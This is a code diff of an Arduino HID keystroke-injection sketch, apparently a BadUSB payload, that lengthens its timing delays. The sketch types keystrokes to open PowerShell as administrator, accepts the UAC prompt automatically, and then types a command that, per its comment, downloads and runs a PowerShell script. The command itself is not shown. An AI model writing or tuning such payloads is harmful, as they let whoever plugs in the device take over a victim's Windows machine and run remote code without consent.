@@ -27,19 +27,19 @@ void setup() {
     // Reset Keyboard Layout to QWERTY
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.write(' ');
-    delay(200);
+    delay(500);
     Keyboard.write('2');
     Keyboard.releaseAll();
-    delay(100); // TODO: consider removing
+    delay(300); // TODO: consider removing
 
     // Search for PowerShell
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.write('q');
     delay(100);
     Keyboard.releaseAll();
-    delay(100);
+    delay(500);
     Keyboard.print("PowerShell");
-    delay(200);
+    delay(600);
 
     // Run as Root
     Keyboard.press(KEY_LEFT_CTRL);
@@ -47,13 +47,13 @@ void setup() {
     delay(100);
     Keyboard.write(KEY_RETURN);
     Keyboard.releaseAll();
-    delay(1000);
+    delay(1500);
 
     // Agree to the UAC
     Keyboard.write(KEY_LEFT_ARROW);
     delay(100);
     Keyboard.write(KEY_RETURN);
-    delay(1500);
+    delay(4000);
 
     // Download and Run PowerShell Script
     Keyboard.print(command);
